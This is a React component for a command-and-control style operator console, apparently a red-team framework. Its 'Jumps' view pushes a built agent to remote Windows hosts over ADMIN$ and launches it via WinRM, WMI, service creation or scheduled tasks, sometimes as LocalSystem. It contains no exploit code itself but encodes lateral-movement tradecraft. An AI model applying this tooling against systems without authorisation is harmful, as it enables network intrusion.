import {useEffect, useState} from 'react';
import {ArrowRight, RefreshCw} from 'lucide-react';
import {api, type Agent, type Deployment} from './api';
import './deployments.css';

type Artifact = {id:string;profile:string;profile_id:string;platform:string;architecture:string;sha256:string;undertow_version?:string;revoked?:boolean;filename:string;hosted?:boolean;service_capable?:boolean};
const methods=[['winrm','WinRM'],['wmi','WMI'],['service-control','Service Control'],['scheduled-task','Scheduled Task']] as const;
const contexts=[['current-user','Current user'],['local-system','LocalSystem']] as const;
const methodName=(value:string)=>methods.find(method=>method[0]===value)?.[1]||value;
const contextName=(value:string)=>contexts.find(context=>context[0]===value)?.[1]||value;
const prerequisites=(method:string,context:string)=>{
  switch(method){
    case 'winrm': return 'WinRM and WinRS must be enabled on the target. The source agent identity must be authorized for the remote session and ADMIN$.';
    case 'wmi': return 'Remote WMI and the target firewall rules must permit process creation. The source agent identity must be able to write to ADMIN$.';
    case 'service-control': return 'The source identity must have target Service Control Manager and administrative share access. The selected build must support Windows services; the service runs as LocalSystem.';
    case 'scheduled-task': return context==='local-system'?'The source identity must have remote Scheduled Task and administrative share access. The one-shot task runs as LocalSystem.':'The source identity must have remote Scheduled Task and administrative share access, and that same identity needs an interactive session on the target.';
    default: return '';
  }
};
const time=(value?:string)=>value?new Date(value).toLocaleString():'—';
const short=(value:string)=>value.length>16?value.slice(0,16)+'…':value;

export function DeploymentsView({agents,initialSource,initialRecord,revision,onAgent,onJob,onTransfers}:{agents:Agent[];initialSource?:string|null;initialRecord?:string|null;revision?:string;onAgent:(id:string)=>void;onJob:(id:string)=>void;onTransfers:()=>void}) {
  const [records,setRecords]=useState<Deployment[]>([]),[artifacts,setArtifacts]=useState<Artifact[]>([]);
  const [source,setSource]=useState(''),[target,setTarget]=useState(''),[artifact,setArtifact]=useState(''),[method,setMethod]=useState('winrm'),[context,setContext]=useState('current-user');
  const [installPath,setInstallPath]=useState('');
  const [selected,setSelected]=useState(''),[candidate,setCandidate]=useState(''),[busy,setBusy]=useState(false),[error,setError]=useState(''),[notice,setNotice]=useState('');
  const reload=async()=>{const [nextRecords,nextArtifacts]=await Promise.all([api<Deployment[]>('/deployments'),api<Artifact[]>('/artifacts')]);setRecords(nextRecords);setArtifacts(nextArtifacts)};
  useEffect(()=>{void reload().catch(e=>setError(String(e)))},[revision]);
  useEffect(()=>{if(initialSource&&agents.some(agent=>agent.id===initialSource&&agent.os?.toLowerCase()==='windows'&&(agent.online!==false||agent.connection_state==='sleeping')))setSource(current=>current||initialSource)},[initialSource,agents]);
  useEffect(()=>{if(initialRecord)setSelected(initialRecord)},[initialRecord]);
  const selectedRecord=records.find(record=>record.id===selected)||records[0];
  const selectedSource=selectedRecord?agents.find(agent=>agent.id===selectedRecord.source_agent_id):undefined;
  useEffect(()=>{setInstallPath('')},[selectedRecord?.id,selectedRecord?.state]);
  const windowsAgents=agents.filter(agent=>agent.os?.toLowerCase()==='windows'&&(agent.online!==false||agent.connection_state==='sleeping')).sort((a,b)=>(a.hostname||'').localeCompare(b.hostname||'')||a.id.localeCompare(b.id));
  const sourceIsWindows=windowsAgents.some(agent=>agent.id===source);
  const formSource=windowsAgents.find(agent=>agent.id===source);
  const availableArtifacts=artifacts.filter(item=>item.platform==='windows'&&!item.revoked&&(method!=='service-control'||item.service_capable));
  const chosenArtifact=availableArtifacts.find(item=>item.id===artifact);
  const versionsMatch=!!formSource?.undertow_version&&!!chosenArtifact?.undertow_version&&formSource.undertow_version===chosenArtifact.undertow_version;
  const incompatibleSelection=!!formSource&&!!chosenArtifact&&!versionsMatch;
  const allowedContexts=contexts.filter(item=>!(method==='service-control'&&item[0]==='current-user')&&!((method==='winrm'||method==='wmi')&&item[0]==='local-system'));
  const matchingAgents=selectedRecord?agents.filter(agent=>agent.online!==false&&agent.id!==selectedRecord.source_agent_id&&agent.artifact_id===selectedRecord.artifact_id&&agent.os?.toLowerCase()==='windows'&&(!selectedRecord.waiting_at||!!agent.connected&&Date.parse(agent.connected)>=Date.parse(selectedRecord.waiting_at))&&(agent.hostname?.toLowerCase()===selectedRecord.target.toLowerCase()||agent.remote?.startsWith(`${selectedRecord.target}:`)||agent.remote?.startsWith(`[${selectedRecord.target}]:`)||agent.interfaces?.some(address=>address.split('=')[1]?.split('/')[0]===selectedRecord.target))):[];
  const run=async(action:()=>Promise<Deployment>,message:string)=>{setBusy(true);setError('');setNotice('');try{const record=await action();await reload();setSelected(record.id);setNotice(message)}catch(e){setError(String(e))}finally{setBusy(false)}};
  const create=()=>run(()=>api<Deployment>('/deployments','POST',{source_agent_id:source,target:target.trim(),artifact_id:artifact,method,context}),'Jump record created');
  const prepare=(id:string)=>run(()=>api<Deployment>(`/deployments/${encodeURIComponent(id)}/prepare`,'POST',{}),'Jump prepared');
  const start=(id:string)=>run(()=>api<Deployment>(`/deployments/${encodeURIComponent(id)}/start`,'POST',{install_path:installPath.trim()}),'Jump accepted; it will run at the source agent\'s next check-in when queued');
  const link=(id:string)=>run(()=>api<Deployment>(`/deployments/${encodeURIComponent(id)}/link`,'POST',{agent_id:candidate}),'Agent linked to Jump');
  return <div className="deployments-layout">
    <section className="panel deployment-create"><div className="deployment-section-heading"><div><h2>New jump</h2><p>Record the target and existing Windows build. Preparing checks that the source agent and artifact are available.</p></div></div>
      <div className="deployment-form">
        <label>Source agent<select value={sourceIsWindows?source:''} onChange={event=>setSource(event.target.value)}><option value="">Select a Windows agent</option>{windowsAgents.map(agent=><option key={agent.id} value={agent.id}>{agent.nickname||agent.hostname||short(agent.id)} · {short(agent.id)}{agent.undertow_version?` · ${agent.undertow_version.split(' ')[0]}`:''}{agent.connection_state==='sleeping'?' · sleeping':''}</option>)}</select></label>
        <label>Target hostname or IP<input value={target} maxLength={253} onChange={event=>setTarget(event.target.value)} placeholder="Target host"/></label>
        <label>Built artifact<select value={artifact} onChange={event=>setArtifact(event.target.value)}><option value="">Select a Windows build</option>{availableArtifacts.map(item=>{const compatible=!formSource||!!formSource.undertow_version&&!!item.undertow_version&&formSource.undertow_version===item.undertow_version;return <option key={item.id} value={item.id} disabled={!compatible}>{item.filename} · {item.profile} · {item.architecture}{item.undertow_version?` · ${item.undertow_version.split(' ')[0]}`:''}{!compatible?' · incompatible source':''}</option>})}</select></label>
        {chosenArtifact&&<div className="deployment-artifact-facts"><span>Profile <strong>{chosenArtifact.profile}</strong></span><span>Undertow <strong>{chosenArtifact.undertow_version||'unknown'}</strong></span><span>SHA-256 <code>{chosenArtifact.sha256}</code></span>{incompatibleSelection&&<span className="deployment-error">Source runs {formSource?.undertow_version||'an unknown version'}; select a build with that exact Undertow version or update the source agent.</span>}</div>}
        <label>Windows method<select value={method} onChange={event=>{const next=event.target.value;setMethod(next);if(next==='service-control'&&context==='current-user')setContext('local-system');if((next==='winrm'||next==='wmi')&&context==='local-system')setContext('current-user');if(next==='service-control'&&chosenArtifact&&!chosenArtifact.service_capable)setArtifact('')}}>{methods.map(item=><option key={item[0]} value={item[0]}>{item[1]}</option>)}</select></label>
        <label>Target execution context<select value={context} onChange={event=>setContext(event.target.value)}>{allowedContexts.map(item=><option key={item[0]} value={item[0]}>{item[1]}</option>)}</select></label>
        <div className="deployment-prerequisites"><strong>Prerequisites</strong><p>{prerequisites(method,context)}</p></div>
      </div>
      <div className="deployment-form-actions"><button disabled={busy||!sourceIsWindows||!target.trim()||!artifact||incompatibleSelection} onClick={create}>Create jump</button><span>Uses the selected source agent's Windows identity. Named-account credentials are not stored.</span></div>
    </section>
    <section className="panel deployment-records"><div className="deployment-section-heading"><div><h2>Jump records</h2><p>Server retained state for Windows targets.</p></div><button className="deployment-refresh" title="Refresh Jump records" onClick={()=>void reload().catch(e=>setError(String(e)))}><RefreshCw size={15}/></button></div>
      <div className="deployment-record-list">{records.map(record=><button key={record.id} className={'deployment-record '+(record.id===selectedRecord?.id?'selected':'')} onClick={()=>{setSelected(record.id);setCandidate('')}}><span><strong>{record.target}</strong><small>{methodName(record.method)} · {record.profile}</small></span><span className={'deployment-state '+record.state}>{record.state}</span></button>)}{records.length===0&&<p>No Jump records yet.</p>}</div>
    </section>
    <section className="panel deployment-detail">{selectedRecord?<><div className="deployment-section-heading"><div><h2>{selectedRecord.target}</h2><p className="mono">{selectedRecord.id}</p></div><span className={'deployment-state '+selectedRecord.state}>{selectedRecord.state}</span></div>
      <div className="deployment-timeline">{(['created','prepared','waiting','completed'] as const).map((state,index)=><div key={state} className={(selectedRecord.state==='dispatching'?2:selectedRecord.state==='failed'?selectedRecord.waiting_at?2:selectedRecord.prepared_at?1:0:['created','prepared','waiting','completed'].indexOf(selectedRecord.state))>=index?'reached':''}><span>{index+1}</span><strong>{state}</strong></div>)}</div>
      <dl className="deployment-facts"><div><dt>Source agent</dt><dd><button onClick={()=>onAgent(selectedRecord.source_agent_id)}>{agents.find(agent=>agent.id===selectedRecord.source_agent_id)?.nickname||agents.find(agent=>agent.id===selectedRecord.source_agent_id)?.hostname||short(selectedRecord.source_agent_id)} <ArrowRight size={13}/></button></dd></div><div><dt>Build / profile</dt><dd>{artifacts.find(item=>item.id===selectedRecord.artifact_id)?.filename||short(selectedRecord.artifact_id)} · {selectedRecord.profile}</dd></div><div><dt>Method / context</dt><dd>{methodName(selectedRecord.method)} · {contextName(selectedRecord.context)}{selectedRecord.account?` · ${selectedRecord.account}`:''}</dd></div><div><dt>Requested by</dt><dd>{selectedRecord.operator_name||selectedRecord.operator_id||selectedRecord.requested_from}</dd></div><div><dt>Created</dt><dd>{time(selectedRecord.created_at)}</dd></div><div><dt>Updated</dt><dd>{time(selectedRecord.updated_at)}</dd></div></dl>
      <div className="deployment-progress"><strong>Progress</strong><p>{selectedRecord.progress||'No progress recorded'}</p>{selectedRecord.error&&<p className="deployment-error">{selectedRecord.error}</p>}</div>
      {selectedRecord.state==='created'&&<div className="deployment-detail-actions"><button disabled={busy} onClick={()=>prepare(selectedRecord.id)}>Prepare jump</button><span>Checks the selected source and build. No host action starts.</span></div>}
      {selectedRecord.state==='prepared'&&<div className="deployment-start"><strong>Start jump</strong><p>The server streams the selected build through the source agent to ADMIN$\Temp, then invokes the selected native Windows management interface. The generated target filename is opaque; enter an absolute .exe path only when the target needs an override.</p>{selectedSource?.connection_state==='sleeping'&&<p className="deployment-queued-note">This source agent is sleeping. Start creates a durable queued Job and dispatches it during the next authenticated check-in.</p>}<div className="deployment-prerequisites"><strong>Method prerequisites</strong><p>{prerequisites(selectedRecord.method,selectedRecord.context)}</p></div><label>Install path override<input value={installPath} maxLength={1024} onChange={event=>setInstallPath(event.target.value)} placeholder="C:\\Windows\\Temp\\&lt;generated&gt;.exe"/></label><button disabled={busy} onClick={()=>start(selectedRecord.id)}>Start jump</button><small>Uses the authenticated agent channel. The target does not retrieve the payload and no shell script is generated.</small></div>}
      {(selectedRecord.delivery_type||selectedRecord.install_path||selectedRecord.service_name||selectedRecord.task_name)&&<dl className="deployment-result-facts">{selectedRecord.delivery_type&&<div><dt>Delivery</dt><dd>{selectedRecord.delivery_type}{selectedRecord.delivery_id&&selectedRecord.delivery_id!=='server'?` · ${short(selectedRecord.delivery_id)}`:''}</dd></div>}{selectedRecord.install_path&&<div><dt>Install path</dt><dd>{selectedRecord.install_path}</dd></div>}{selectedRecord.service_name&&<div><dt>Service</dt><dd>{selectedRecord.service_name}</dd></div>}{selectedRecord.task_name&&<div><dt>Task</dt><dd>{selectedRecord.task_name}</dd></div>}</dl>}
      {selectedRecord.job_id&&<button className="deployment-link" onClick={()=>onJob(selectedRecord.job_id!)}>View job {short(selectedRecord.job_id)} <ArrowRight size={13}/></button>}
      {selectedRecord.transfer_id&&<button className="deployment-link" onClick={onTransfers}>View transfer {short(selectedRecord.transfer_id)} <ArrowRight size={13}/></button>}
      {selectedRecord.result_agent_id&&<button className="deployment-link" onClick={()=>onAgent(selectedRecord.result_agent_id!)}>Open resulting agent {short(selectedRecord.result_agent_id)} <ArrowRight size={13}/></button>}
      {selectedRecord.state==='waiting'&&!selectedRecord.result_agent_id&&<div className="deployment-link-agent"><strong>Associate an enrolled agent</strong><p>Automatic association requires an unambiguous new agent. Review a matching callback here if it remains unlinked.</p><select value={candidate} onChange={event=>setCandidate(event.target.value)}><option value="">Select matching agent</option>{matchingAgents.map(agent=><option key={agent.id} value={agent.id}>{agent.hostname||short(agent.id)} · {short(agent.id)}</option>)}</select><button disabled={busy||!candidate} onClick={()=>link(selectedRecord.id)}>Link agent</button>{matchingAgents.length===0&&<small>No matching agent is currently connected.</small>}</div>}
    </>:<div className="deployment-empty">Select a record to inspect its state and result.</div>}</section>
    {(error||notice)&&<div className={'deployment-message '+(error?'error':'')} role="status">{error||notice}</div>}
  </div>;
}
